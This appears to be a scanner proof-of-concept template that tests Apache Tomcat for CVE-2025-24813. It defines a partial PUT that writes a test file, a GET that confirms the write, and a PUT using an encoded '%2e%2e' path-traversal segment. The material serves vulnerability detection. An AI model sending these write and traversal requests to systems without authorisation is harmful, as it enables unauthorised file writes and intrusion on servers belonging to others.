[info]
id = "POC-AVE-2025-0017"
name = "Apache Tomcat CVE-2025-24813 路径等价漏洞 PoC"
author = "AVE"
severity = "critical"
tags = ["rce", "tomcat", "path-traversal", "cwe-44"]
description = "Apache Tomcat 路径等价漏洞（CVE-2025-24813）检测，通过部分 PUT 请求测试 Default Servlet 写入权限及路径遍历，判断目标是否存在远程代码执行或信息泄露风险"
vuln_id = ["CVE-2025-24813", "AVE-2025-0017"]

[poc]
logic = "all"

[[poc.requests]]
method = "PUT"
path = "/AVE-0017-check.txt"
headers.Content-Type = "text/plain"
headers.Content-Range = "bytes 0-13/14"
body.type = "raw"
body.content = "CVE-2025-24813"

[[poc.requests.matchers]]
type = "status"
status = [200, 201, 204]
expect = true

[[poc.requests]]
method = "GET"
path = "/AVE-0017-check.txt"

[[poc.requests.matchers]]
type = "word"
part = "body"
words = ["CVE-2025-24813"]
expect = true

[[poc.requests]]
method = "PUT"
path = "/AVE-0017-%2e%2e/AVE-0017-traversal.txt"
headers.Content-Type = "text/plain"
body.type = "raw"
body.content = "path-traversal-test"

[[poc.requests.matchers]]
type = "status"
status = [200, 201, 204, 409]
expect = true
